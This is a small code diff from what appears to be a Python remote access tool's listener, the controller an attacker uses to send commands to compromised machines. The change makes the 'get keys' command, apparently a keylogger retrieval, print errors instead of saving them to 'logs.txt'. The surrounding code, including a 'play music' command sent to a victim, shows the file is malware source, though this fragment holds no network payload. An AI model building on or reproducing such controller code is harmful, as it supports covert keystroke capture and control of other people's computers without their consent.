@@ -225,7 +225,10 @@ class Listener:
 			elif command == "get keys":
 				if self.chosen_connection:
 					res = self.execute_remotely(command)
-					self.write_file("logs.txt", res)
+					if res.split()[0] == "[-]":
+						print(colored(res, "red"))
+					else:
+						self.write_file("logs.txt", res)
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command == "play music":
